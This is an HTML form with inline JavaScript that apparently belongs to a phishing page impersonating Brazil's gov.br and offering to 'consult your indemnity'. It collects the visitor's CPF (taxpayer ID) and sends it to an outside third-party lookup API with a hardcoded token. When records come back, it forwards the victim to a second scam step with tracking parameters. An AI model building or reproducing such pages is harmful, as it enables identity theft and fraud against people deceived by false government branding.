        <form id="cpfForm">
            <label for="cpf"><img decoding="async" src="images/01.png" class="icon" alt="CPF Icone"> Número do CPF</label>
            <p class="input-label">Digite seu CPF para <span class="highlight">consultar</span> sua indenização do gov.br</p>
            
            <p style="margin-top: 20px;">CPF</p>
            
            <input type="tel" id="cpf" name="cpf" placeholder="Digite seu CPF" pattern="\d*" required="">
            <button type="submit" style="background-color: #1355B6; color: white; font-weight: bold; padding: 10px 20px; border: none; cursor: pointer; border-radius: 10px; width: 100%;">Consultar Indenização</button>
        </form>
    </div>
    <script>
        function getQueryParam(param) {
            let urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(param);
        }

        function isValidCPF(cpf) {
            cpf = cpf.replace(/[^\d]+/g, '');
            if (cpf.length !== 11 || /^(.)\1+$/.test(cpf)) return false;
            let sum = 0, remainder;
            for (let i = 1; i <= 9; i++) sum += parseInt(cpf.substring(i-1, i)) * (11 - i);
            remainder = (sum * 10) % 11;
            if (remainder === 10 || remainder === 11) remainder = 0;
            if (remainder !== parseInt(cpf.substring(9, 10))) return false;
            sum = 0;
            for (let i = 1; i <= 10; i++) sum += parseInt(cpf.substring(i-1, i)) * (12 - i);
            remainder = (sum * 10) % 11;
            if (remainder === 10 || remainder === 11) remainder = 0;
            if (remainder !== parseInt(cpf.substring(10, 11))) return false;
            return true;
        }

        document.getElementById('cpfForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const cpf = document.getElementById('cpf').value;

            if (!isValidCPF(cpf)) {
                alert('CPF inválido. Por favor, digite um CPF válido.');
                return;
            }

            // Faz a consulta na API
            const apiUrl = `https://searchapi.dnnl.live/consulta?token_api=7490&cpf=${cpf}`;
            
            try {
                const response = await fetch(apiUrl);
                const data = await response.json();
                
                if (data && data.dados && data.dados.length > 0) {
                    // Constrói a URL com os parâmetros UTM
                    const params = new URLSearchParams(window.location.search);
                    params.set('cpf', cpf);
                    
                    // Redireciona para etapa2
                    window.location.href = `../etapa2?${params.toString()}`;
                } else {
                    alert('CPF não encontrado. Por favor, verifique e tente novamente.');
                }
            } catch (error) {
                alert('Erro ao consultar o CPF. Por favor, tente novamente.');
            }
        });
    </script>
